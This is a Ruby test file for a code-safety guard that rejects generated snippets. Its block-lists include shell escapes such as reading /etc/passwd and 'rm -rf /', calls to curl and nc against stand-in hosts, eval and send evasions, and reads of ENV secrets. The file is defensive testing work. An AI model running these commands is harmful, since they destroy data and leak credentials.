# frozen_string_literal: true

require_relative "../test_helper"

class TestSecurityGuardSynthesis < Minitest::Test
  def setup
    @guard = Rubik::Security::Guard.new
  end

  def test_permits_benign_synthesis_code
    valid_code = "->(args, out, shell) { out.puts \"Hello \#{args.inspect}\" }"
    assert @guard.verify_synthesis_safety!(valid_code)

    tool_code = <<~RUBY
      ->(args) do
        { ok: true, sum: args["a"].to_i + args["b"].to_i }
      end
    RUBY
    assert @guard.verify_synthesis_safety!(tool_code)
  end

  def test_blocks_dynamic_send_eval_attempts
    evasions = [
      "send(:eval, 'system(\"calc\")')",
      "send :eval, 'system(\"calc\")'",
      "public_send('eval', 'bad_stuff')",
      "public_send 'eval', 'bad_stuff'",
      "__send__(:instance_eval, 'code')",
      "__send__ :instance_eval, 'code'",
      "send(:system, 'whoami')",
      "send :system, 'whoami'",
      "send(:exec, 'bash')",
      "send :exec, 'bash'"
    ]

    evasions.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_backticks_and_percent_x_execution
    shell_escapes = [
      "`whoami`",
      "`cat /etc/passwd`",
      "%x(ls -la)",
      "%x{rm -rf /}",
      "%x[id]"
    ]

    shell_escapes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_binding_eval
    code = "binding.eval('File.read(\"/etc/passwd\")')"
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!(code)
    end
  end

  def test_blocks_process_and_popen_tampering
    bad_codes = [
      "IO.popen('id').read",
      "Process.kill('KILL', 1234)",
      "Process.spawn('cmd.exe')",
      "Open3.capture2('sh -c bad')",
      "Kernel.exec('bash')"
    ]

    bad_codes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_namespace_mutations
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!("Object.const_set(:HACKED, true)")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!("Kernel.const_set(:EVIL, 1)")
    end
  end

  def test_blocks_indirect_and_dynamic_send_evasions
    indirect_attempts = [
      "method_sym = :eval; target.send(method_sym, 'code')",
      "target.public_send(dyn_method, *args)",
      "receiver.__send__(cmd, arg1)",
      "send(foo, bar)",
      "public_send :danger, 123"
    ]

    indirect_attempts.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_direct_eval_and_eval_variants
    eval_variants = [
      "eval('1 + 1')",
      "eval code_string",
      "self.instance_eval { @secret }",
      "klass.class_eval { def pwned; end }",
      "mod.module_eval { puts 'bad' }"
    ]

    eval_variants.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_instance_variable_and_constant_introspection
    introspection_attempts = [
      "obj.instance_variable_get(:@root_dir)",
      "obj.instance_variable_set(:@hacked, true)",
      "Rubik.const_get(:Config)",
      "const_get('Security')"
    ]

    introspection_attempts.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_bare_process_execution_calls
    process_calls = [
      "system('curl evil.com')",
      "system \"nc 1.2.3.4 80\"",
      "exec('bash')",
      "exec \"sh\"",
      "spawn('python3 bad.py')",
      "fork { puts 1 }",
      "fork do; puts 1; end",
      "syscall(1, 2, 3)",
      "exit!(1)",
      "exit!"
    ]

    process_calls.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_method_reflection_evasions
    method_reflections = [
      "method(:system).call('id')",
      "method :system",
      "public_method(:eval).call('1+1')",
      "singleton_method(:exec).call('bash')"
    ]

    method_reflections.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_env_and_io_global_access
    escapes = [
      "ENV['SECRET']",
      "ENV.fetch('TOKEN', nil)",
      "ObjectSpace.each_object { |o| }",
      "ObjectSpace._id2ref(1)",
      "STDIN.gets",
      "STDOUT.puts 'x'",
      "STDERR.puts 'x'",
      "ARGF.read",
      "Signal.trap('INT') { }"
    ]

    escapes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_allows_benign_method_and_system_names_in_strings_and_hashes
    safe_snippets = [
      "args['method'] == 'GET'",
      "hash = { method: :post }",
      "out.puts 'operating system check'",
      "system_info = args['system_info']",
      "is_executable = true"
    ]

    safe_snippets.each do |code|
      assert @guard.verify_synthesis_safety!(code)
    end
  end
end
